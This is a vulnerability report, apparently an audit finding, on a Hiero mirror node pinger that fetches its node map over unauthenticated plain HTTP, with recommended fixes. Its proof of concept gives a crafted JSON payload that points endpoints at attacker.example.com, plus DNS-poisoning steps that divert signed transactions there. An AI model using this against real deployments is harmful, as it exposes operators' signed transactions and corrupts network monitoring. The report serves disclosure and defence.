### Title
Unauthenticated Plain-HTTP Fetch of Node Configuration Enables Network Partition via DNS Poisoning or MITM

### Summary
`buildNetworkFromMirrorNodes()` fetches the entire Hiero node network map over a plain, unauthenticated HTTP connection with no TLS enforcement, no certificate pinning, and no cryptographic integrity verification of the returned payload. An attacker who can redirect the DNS resolution of the hostname in `cfg.mirrorRest` — or perform any network-level interception — can serve a crafted `nodesEnvelope` that causes the pinger to submit all transactions exclusively to attacker-controlled gRPC endpoints. Because this network map is built once at startup and fed directly into `hiero.ClientForNetwork()`, the entire pinger session operates on the poisoned partition.

### Finding Description

**Code path:**

`pinger/config.go` line 37 — `cfg.mirrorRest` is populated from `HIERO_MIRROR_PINGER_REST`. The documented example is explicitly `http://mirror-rest:5551` (plain HTTP, hostname-based). [1](#0-0) 

`pinger/mirror_node_client.go` line 46 — a bare `http.Client` is constructed with no `Transport` override, no TLS config, and no scheme enforcement: [2](#0-1) 

`pinger/mirror_node_client.go` lines 79–84 — the GET request is issued to whatever URL was constructed from `cfg.mirrorRest`, with no redirect policy and no TLS verification: [3](#0-2) 

`pinger/mirror_node_client.go` lines 95–124 — the response body is decoded into `nodesEnvelope` and every returned endpoint is accepted into the network map. The only validation is that `NodeAccountID` is non-empty and parseable, and that `host`/`port` are non-empty — all trivially satisfied by an attacker: [4](#0-3) 

`pinger/sdk_client.go` lines 18–22 — the poisoned map is passed directly to `hiero.ClientForNetwork()`, making it the sole network for all subsequent transactions: [5](#0-4) 

**Root cause:** The code makes a foundational trust assumption — that the HTTP response from `cfg.mirrorRest` is authentic. There is no TLS enforcement (HTTP is the documented default), no certificate pinning, no HMAC/signature on the payload, and no cross-validation against a known-good node set. Any party who can influence what the HTTP GET returns controls the entire network topology the pinger uses.

**Failed assumption:** The design assumes the network path to `cfg.mirrorRest` is trusted and unmodifiable by an attacker. This assumption fails under DNS poisoning, BGP hijacking, ARP poisoning on the same L2 segment, or any cluster-internal DNS compromise.

### Impact Explanation

Once the poisoned `nodesEnvelope` is accepted, `hiero.ClientForNetwork(netmap)` configures the SDK client with exclusively attacker-controlled gRPC endpoints. Every `CryptoTransfer` executed by `submitWithRetry()` is sent to those endpoints. The attacker can:

- **Observe all signed transactions** — including the operator's signed payloads, enabling replay attacks or analysis of signing patterns.
- **Drop or delay all transactions** — causing the pinger to report false network unavailability.
- **Return crafted gRPC responses** — manipulating receipt statuses, transaction IDs, and consensus timestamps reported back to the pinger.
- **Cause complete network partition** — the pinger operates in a fully isolated, attacker-controlled shadow network for the entire process lifetime (the map is built once at startup and never refreshed).

Severity: **High**. The pinger's operator key signs transactions destined for adversarial nodes, and the entire monitoring signal is under attacker control.

### Likelihood Explanation

The documented default scheme is `http://` (not `https://`), meaning TLS is not even a barrier. Attack vectors include:

1. **DNS poisoning of cluster-internal DNS** (e.g., CoreDNS in Kubernetes) — requires some cluster-level access but is a known lateral-movement technique.
2. **External DNS poisoning** — if `cfg.mirrorRest` uses a public hostname, classic DNS cache poisoning (Kaminsky-style) or BGP hijacking applies.
3. **Network-level MITM** — on the same L2/L3 segment (cloud VPC, shared hosting), ARP/ICMP redirect attacks work without any DNS involvement at all.

The attack is repeatable: since the network map is fetched at startup, a single successful interception of the bootstrap HTTP request is sufficient to poison the entire session. No ongoing access is required after the initial redirect.

### Recommendation

1. **Enforce HTTPS** — reject any `cfg.mirrorRest` URL that does not use the `https://` scheme at config validation time (`pinger/config.go` `loadConfig()`).
2. **Pin the TLS certificate or CA** — configure the `http.Client` `Transport` with a `tls.Config` that pins the expected CA or leaf certificate for the mirror node endpoint.
3. **Verify response integrity** — if the mirror node API supports it, validate a cryptographic signature or checksum on the returned node list before trusting it.
4. **Cross-validate returned endpoints** — for `network=other`, optionally accept a static allowlist of known-good node account IDs or IP ranges and reject any `nodesEnvelope` that introduces endpoints outside that set.
5. **Refresh with continuity check** — if the network map is ever refreshed at runtime, reject updates that replace all known nodes simultaneously (a full replacement is a strong signal of poisoning).

### Proof of Concept

**Preconditions:**
- Pinger deployed with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551` (the documented default example).
- Attacker has the ability to poison the DNS record for `mirror-rest` (e.g., via cluster-internal DNS compromise, or network-level MITM on the HTTP connection).

**Steps:**

1. Stand up an attacker HTTP server on `attacker.example.com:80` serving:
```json
{
  "nodes": [
    {
      "node_account_id": "0.0.3",
      "service_endpoints": [
        { "ip_address_v4": "attacker.example.com", "port": 50211 }
      ]
    }
  ],
  "links": { "next": null }
}
```

2. Poison DNS so that `mirror-rest` resolves to `attacker.example.com`.

3. Start (or restart) the pinger. `buildNetworkFromMirrorNodes()` issues `GET http://mirror-rest:5551/api/v1/network/nodes`, which resolves to the attacker server.

4. The attacker server returns the crafted `nodesEnvelope`. All validation in `fetchMirrorNodeNetwork()` passes (non-empty `node_account_id`, non-empty host, non-zero port).

5. `hiero.ClientForNetwork({"attacker.example.com:50211": AccountID{0,0,3}})` is called. The pinger now submits all `CryptoTransfer` transactions to `attacker.example.com:50211`.

6. The attacker's gRPC server receives all signed transactions from the pinger's operator key for the lifetime of the process.
